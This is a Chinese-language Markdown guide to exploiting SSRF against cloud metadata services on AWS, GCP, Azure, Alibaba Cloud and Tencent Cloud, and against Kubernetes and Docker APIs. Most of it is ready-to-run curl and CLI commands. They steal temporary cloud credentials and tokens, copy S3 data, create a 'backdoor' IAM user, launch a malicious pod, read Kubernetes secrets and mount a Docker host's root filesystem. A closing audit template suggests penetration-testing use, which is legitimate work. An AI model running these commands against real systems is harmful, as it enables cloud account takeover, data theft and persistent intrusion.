# 云环境元数据服务 SSRF 利用指南

## 目录

- [1. AWS 元数据服务](#1-aws-元数据服务)
- [2. GCP 元数据服务](#2-gcp-元数据服务)
- [3. Azure 元数据服务](#3-azure-元数据服务)
- [4. 阿里云元数据服务](#4-阿里云元数据服务)
- [5. 腾讯云元数据服务](#5-腾讯云元数据服务)
- [6. Kubernetes](#6-kubernetes)
- [7. Docker](#7-docker)
- [8. 通用利用链构建](#8-通用利用链构建)

---

## 1. AWS 元数据服务

### 1.1 端点信息

| 版本 | 端点 | 说明 |
|------|------|------|
| IMDSv1 | `http://169.254.169.254/latest/meta-data/` | 无需 Token |
| IMDSv2 | `http://169.254.169.254/latest/api/token` → 用 Token 访问 meta-data | 需 PUT 请求获取 Token |
| ECS Task | `http://169.254.170.2/v2/credentials/` | ECS Task Role |

### 1.2 IMDSv1 利用链

```bash
# 1. 枚举所有可用路径
curl http://169.254.169.254/latest/meta-data/

# 2. 获取 IAM Role 名称
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 3. 获取临时凭证 (最关键一步!)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# 返回: AccessKeyId, SecretAccessKey, Token, Expiration

# 4. 其他敏感信息
curl http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key  # SSH 公钥
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/   # MAC 地址
curl http://169.254.169.254/latest/user-data/                            # User Data (可能含密码)
```

### 1.3 IMDSv2 限制

```
AWS IMDSv2 要求 PUT 请求获取 Token，再通过 Token 访问元数据：
1. PUT http://169.254.169.254/latest/api/token
   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. GET http://169.254.169.254/latest/meta-data/
   Header: X-aws-ec2-metadata-token: <token>

SSRF 能否发起 PUT 请求决定了是否能攻击 IMDSv2。
- HttpURLConnection: setRequestMethod("PUT") → 可以
- RestTemplate: restTemplate.exchange(url, HttpMethod.PUT, ...) → 可以
- OkHttp: new Request.Builder().put(body).url(url) → 可以
```

### 1.4 凭证利用

```
获取到 AccessKeyId + SecretAccessKey + Token 后：

# 配置 AWS CLI
aws configure set aws_access_key_id <AKIAIOSFODNN7EXAMPLE>
aws configure set aws_secret_access_key <wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY>
aws configure set aws_session_token <token>

# S3 bucket 操作
aws s3 ls
aws s3 cp s3://bucket/sensitive.txt ./

# EC2 操作
aws ec2 describe-instances
aws ec2 create-tags --resources i-xxxxx --tags Key=Name,Value=owned

# IAM 操作
aws iam list-users
aws iam create-user --user-name backdoor
```

---

## 2. GCP 元数据服务

### 2.1 端点信息

| 端点 | 说明 |
|------|------|
| `http://metadata.google.internal/computeMetadata/v1/` | 主端点 |
| `http://169.254.169.254/computeMetadata/v1/` | 备用端点 |

**必须带 Header**: `Metadata-Flavor: Google`

### 2.2 利用链

```bash
# 1. 枚举（注意必须带 Header）
curl http://metadata.google.internal/computeMetadata/v1/ \
  -H "Metadata-Flavor: Google"

# 2. 获取 Service Account Token
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google"

# 3. 获取 Service Account Email
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email \
  -H "Metadata-Flavor: Google"

# 4. 获取 SSH 密钥
curl http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys \
  -H "Metadata-Flavor: Google"

# 5. 获取 kube-env (GKE)
curl http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env \
  -H "Metadata-Flavor: Google"
```

### 2.3 Token 利用

```
gcloud auth activate-service-account --key-file=<service-account.json>

# 获取所有 GCS buckets
gsutil ls

# 获取 GKE 集群凭据
gcloud container clusters get-credentials <cluster> --zone <zone>

# 读取 Secret Manager
gcloud secrets versions access latest --secret=<secret-name>
```

---

## 3. Azure 元数据服务

### 3.1 端点信息

| 端点 | 说明 |
|------|------|
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | 主端点 |

**必须带 Header**: `Metadata: true`

### 3.2 利用链

```bash
# 1. 获取 Managed Identity Token
curl http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ \
  -H "Metadata: true"

# 2. 获取实例信息
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 \
  -H "Metadata: true"

# 3. 获取自定义数据
curl http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01&format=text \
  -H "Metadata: true"
```

### 3.3 利用 Managed Identity

```bash
# 使用 Token 访问 Azure REST API
curl https://management.azure.com/subscriptions?api-version=2021-04-01 \
  -H "Authorization: Bearer <token>"

# 列出 Key Vaults
curl https://management.azure.com/subscriptions/<sub-id>/resources?$filter=resourceType eq 'Microsoft.KeyVault/vaults'&api-version=2021-04-01 \
  -H "Authorization: Bearer <token>"
```

---

## 4. 阿里云元数据服务

### 4.1 端点信息

| 端点 | 说明 |
|------|------|
| `http://100.100.100.200/latest/meta-data/` | ECS 元数据 |

### 4.2 利用链

```bash
# 1. 枚举元数据
curl http://100.100.100.200/latest/meta-data/

# 2. 获取 RAM Role 名称
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 3. 获取临时凭证
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>
# 返回: AccessKeyId, AccessKeySecret, SecurityToken

# 4. 获取实例信息
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/private-ipv4
```

---

## 5. 腾讯云元数据服务

### 5.1 端点信息

| 端点 | 说明 |
|------|------|
| `http://metadata.tencentyun.com/latest/meta-data/` | CVM 元数据 |

### 5.2 利用链

```bash
# 1. 枚举
curl http://metadata.tencentyun.com/latest/meta-data/

# 2. 获取 CAM Role
curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>
```

---

## 6. Kubernetes

### 6.1 端点信息

| 端点 | 说明 |
|------|------|
| `https://kubernetes.default.svc` | K8s API Server (内部) |
| `https://kubernetes.default.svc/api/v1/namespaces/` | 列举 namespaces |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` | ServiceAccount Token (文件) |

### 6.2 利用链

```bash
# 需要从 Pod 内部发起（通过 SSRF 代理请求到 K8s API）

# 1. 获取当前 namespace 的 Pods
curl https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  -k

# 2. 创建恶意 Pod
curl -X POST https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -k \
  -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil-pod"},...}'

# 3. 列举 Secrets
curl https://kubernetes.default.svc/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer <token>" \
  -k

# 4. 执行命令 (需要 pods/exec 权限)
curl https://kubernetes.default.svc/api/v1/namespaces/default/pods/target-pod/exec?command=id&stdout=true&stderr=true \
  -H "Authorization: Bearer <token>" \
  -k
```

### 6.3 K8s API 匿名访问检查

```bash
# 某些配置错误的集群允许匿名访问
curl https://kubernetes.default.svc/api/v1/namespaces/default/pods -k

# 通过 SSRF 探测
http://kubernetes.default.svc/api/v1/namespaces/default/pods
```

---

## 7. Docker

### 7.1 端点信息

| 端点 | 说明 |
|------|------|
| `http://172.17.0.1:2375/containers/json` | Docker API (HTTP, 无 TLS) |
| `http://172.17.0.1:2376/containers/json` | Docker API (HTTPS) |
| `unix:///var/run/docker.sock` | Docker Socket (文件系统访问，非 HTTP SSRF) |

### 7.2 利用链

```bash
# 1. 列举容器
curl http://172.17.0.1:2375/containers/json

# 2. 在容器中执行命令
curl -X POST http://172.17.0.1:2375/containers/<container-id>/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdin":false,"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/sh","-c","id"]}'

# 3. 创建新容器挂载宿主机根目录
curl -X POST http://172.17.0.1:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Mounts":[{"Source":"/","Target":"/host","Type":"bind"}]}'
```

---

## 8. 通用利用链构建

### 8.1 SSRF 可打内网时的攻击路径

```
优先级 1: 元数据服务 (直接获取云凭证)
  → AWS: 169.254.169.254
  → GCP: metadata.google.internal
  → Azure: 169.254.169.254 (需 Metadata: true header)
  → Aliyun: 100.100.100.200
  → Tencent: metadata.tencentyun.com

优先级 2: 内网服务 (数据库、缓存、消息队列)
  → Redis: 6379 (未授权访问 → 写 SSH key / 写 crontab)
  → MySQL: 3306 (Gopher:// 协议走私执行 SQL)
  → Elasticsearch: 9200 (未授权 → 数据窃取)
  → MongoDB: 27017 (未授权 → 数据窃取)

优先级 3: 内网 Web 应用
  → Jenkins: 8080 (未授权 → Script Console RCE)
  → Admin panels
  → Internal APIs
```

### 8.2 无法自定义 Header 时的攻击

```java
// 若 HTTP 客户端无法添加自定义 Header（如 Metadata-Flavor: Google）
// GCP/Azure 元数据可能无法直接访问，但不影响：
// - AWS IMDSv1 (不需要 Header)
// - 阿里云 (不需要 Header)
// - 腾讯云 (不需要 Header)
// - 内网探测

// 替代方案：判断云平台
// GET http://169.254.169.254/latest/meta-data/
// - 返回 200 + AWS 格式 → AWS
// - 返回 400/404 → 可能 GCP/Azure (需要 Header)
// - 返回 200 + 中文 → 阿里云 (100.100.100.200)
```

### 8.3 审计模板 — SSRF 影响评估

对每个 SSRF 漏洞，必须评估以下内网可达性：

```markdown
### 内网可达性评估

| 项目 | 状态 |
|------|------|
| 目标系统部署环境 | 云 / 物理机 / 容器 |
| HTTP 代理配置 | 有 / 无 |
| 内网 DNS 可达性 | ✅ / ❌ |
| IMDS 端点可达 | ✅ / ❌ |
| K8s API 可达 | ✅ / ❌ |
| Docker API 可达 | ✅ / ❌ |
| 已知内网服务 | 列举 |

### 利用链

Step 1: 确认 SSRF 可打内网 (无代理/防火墙阻断)
Step 2: 探测云平台类型
Step 3: 获取云凭证 / 攻击内网服务
Step 4: 横向移动
```
